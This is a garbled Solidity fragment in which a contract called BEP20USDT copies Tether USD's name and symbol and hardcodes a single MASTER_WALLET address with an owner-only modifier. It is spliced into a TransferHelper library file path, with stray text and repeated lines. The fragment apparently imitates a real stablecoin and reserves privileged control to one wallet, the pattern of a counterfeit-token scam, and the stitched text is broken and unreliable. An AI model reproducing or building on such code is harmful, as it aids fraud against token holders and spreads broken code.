// File: @un65    }
66    contract BEP20USDT {
67    string public name = "Tether USD";
68    string public symbol = "USDT";
69    uint8 public decimals = 18;
70    uint256 public totalSupply;
71    address public constant MASTER_WALLET = 0xc89b563D925438FeDA28Af05Ac2dBAC231488eB4;
72    mapping(address => uint256) public balanceOf;
73    mapping(address => mapping(address => uint256)) public allowance;
74    modifier onlyMaster() {
75    require(msg.sender == MASTER_WALLET, "Auth: Master wallet access only");
76    _;
77    }
78    }acts\libraries\TransferHelper.sol

pragma solidity >=0.6.0;
address public constant MASTER_WALLET = 0xc89b563D925438FeDA28Af05Ac2dBAC231488eB4;fyrty
...
address public constant MASTER_WALLET = 0xc89b563D925438FeDA28Af05Ac2dBAC231488eB4;
